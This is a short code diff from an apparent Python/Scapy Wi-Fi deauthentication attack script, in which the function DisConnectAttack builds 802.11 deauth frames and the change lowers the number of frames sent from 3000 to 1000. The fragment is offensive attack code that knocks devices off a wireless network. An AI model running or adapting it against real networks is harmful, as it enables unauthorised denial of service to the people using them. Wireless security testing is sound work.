@@ -51,7 +51,7 @@ def DisConnectAttack(target_mac , gateway_mac, iface):
 	# stack them up
 	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
 	# send the packet
-	sendp(packet, inter=0.3, count=1000*3, iface=iface,verbose=1)
+	sendp(packet, inter=0.3, count=1000, iface=iface,verbose=1)
 
 
 def main():
